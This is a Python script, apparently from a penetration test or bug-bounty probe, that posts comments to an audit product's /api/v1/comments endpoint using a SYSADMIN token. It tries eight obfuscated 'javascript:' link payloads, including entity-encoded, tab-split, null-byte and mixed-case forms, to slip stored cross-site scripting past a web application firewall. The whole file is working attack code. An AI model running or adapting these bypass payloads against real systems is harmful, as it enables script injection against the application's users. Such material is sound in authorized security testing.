import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXJ'+uuid.uuid4().hex[:5]
print("=== javascript: href variants (WAF may block 'javascript') ===")
variants=[
 ('plain',      f'<a href="javascript:alert(1)">{tag}</a>'),
 ('noquote',    f'<a href=javascript:alert(1)>{tag}</a>'),
 ('entity-j',   f'<a href="&#106;avascript:alert(1)">{tag}</a>'),
 ('tab',        f'<a href="java\tscript:alert(1)">{tag}</a>'),
 ('newline',    f'<a href="java\nscript:alert(1)">{tag}</a>'),
 ('nullbyte',   f'<a href="java\x00script:alert(1)">{tag}</a>'),
 ('upper',      f'<a href="JaVaScRiPt:alert(1)">{tag}</a>'),
 ('colonspace', f'<a href="javascript&colon;alert(1)">{tag}</a>'),
]
for label,msg in variants:
    c,b=post({"comment":{"message_raw":msg,"type":"Comment",
                         "commentable_type":"ExceptionRequest","commentable_id":33}})
    print(f"  {label:12} {c:>4}  {b[:100].replace(chr(10),' ')}")
